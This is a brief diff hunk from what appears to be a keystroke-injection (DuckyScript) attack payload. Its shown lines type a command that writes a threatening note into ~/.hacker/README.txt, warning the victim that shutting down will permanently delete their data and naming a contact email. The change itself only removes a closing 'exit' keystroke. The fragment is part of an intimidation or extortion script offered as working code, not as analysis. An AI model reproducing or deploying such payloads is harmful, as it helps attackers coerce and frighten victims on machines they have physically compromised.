@@ -133,5 +133,3 @@ DELAY 100
 echo I'm Hacker Don't try to ShutDown your system this will permanantly delete your data, contact jacobjuneau6@gmail.com for further details... >> ~/.hacker/README.txt
 ENTER
 DELAY 50
-STRING exit
-ENTER
